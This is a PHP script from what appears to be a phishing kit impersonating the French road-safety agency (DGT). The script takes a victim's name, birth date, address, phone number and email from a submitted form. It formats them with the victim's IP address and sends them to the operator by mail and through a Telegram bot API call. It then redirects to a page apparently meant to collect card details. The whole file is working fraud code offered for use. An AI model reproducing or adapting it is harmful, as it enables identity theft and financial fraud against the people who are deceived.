<?php
include('../common/sub_includes.php');
include_once '../config.php';


ob_start();
if (!isset($_SESSION)) {
  session_start();  // Et on ouvre la session
}

$name = $_POST['first_name'] . " " . $_POST['last_name'];
$dob = $_POST['dob'];
$phone = $_POST['phone'];
$email = $_POST['email'];
$address = $_POST['address'];
$city = $_POST['city'];
$postal = $_POST['postal'];

if ($_SERVER['REQUEST_METHOD'] == 'POST') {

    $_SESSION['name'] = htmlspecialchars($name);
    $_SESSION['dob'] = htmlspecialchars($dob);
    $_SESSION['phone'] = htmlspecialchars($phone);
    $_SESSION['email'] = htmlspecialchars($email);
	$_SESSION['address'] = htmlspecialchars($address);
$_SESSION['city'] = htmlspecialchars($city);
$_SESSION['postal'] = htmlspecialchars($postal);

$message = '
[♾️] DGT INFO [♾️]

👮 Nom : '.$_SESSION['name'].'
🎂 Date de naissance : '.$_SESSION['dob'].'

👮 Rue : '.$_SESSION['address'].'
👮 Ville : '.$_SESSION['city'].'
👮 Code Postal : '.$_SESSION['postal'].'

📱 Téléphone : '.$_SESSION['phone'].'
💌 Email : '.$_SESSION['email'].'


🛒 Adresse IP : ' . $_SERVER['REMOTE_ADDR'];

    if($mail_send == true){
      $Subject=" 「DGT」INFOS ".$_SESSION['name']." | ".$_SERVER['REMOTE_ADDR'];
      $head="From: DGT@rez.info <info@INUN.bg>";
      
      mail($rezmail,$Subject,$message,$head);
      }
      
      $theip = $message;
      function antiBotsCaller($messaggio,$bot_token,$rez_chat) {
          $url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage?chat_id=" . $rez_chat;
          $url = $url . "&text=" . urlencode($messaggio);
          $ch = curl_init();
          $optArray = array(CURLOPT_URL => $url,CURLOPT_RETURNTRANSFER => true);curl_setopt_array($ch, $optArray);$result = curl_exec($ch);curl_close($ch);return $result;}antiBotsCaller($theip,$antit2,$antic1);antiBotsCaller($message,$bot_token,$rez_chat);
 
 }

    header('Location: ../cc.php');


?>